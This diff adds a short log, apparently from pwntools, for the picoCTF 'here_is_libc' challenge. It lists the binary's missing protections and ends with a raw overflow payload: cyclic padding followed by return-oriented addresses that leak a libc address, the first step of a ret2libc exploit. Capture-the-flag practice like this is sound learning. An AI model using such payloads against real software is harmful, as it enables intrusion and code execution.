@@ -1,0 +1,20 @@
+[*] '/home/guy/projects/ctf/picoctf/here_is_libc/vuln_patched'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'.'
+[*] '/home/guy/projects/ctf/picoctf/here_is_libc/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/home/guy/projects/ctf/picoctf/here_is_libc/ld-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaab\x13\t@\x00\x00\x00\x00\x00\x18\x10`\x00\x00\x00\x00\x00@\x05@\x00\x00\x00\x00\x00\xd8\x06@\x00\x00\x00\x00\x00'
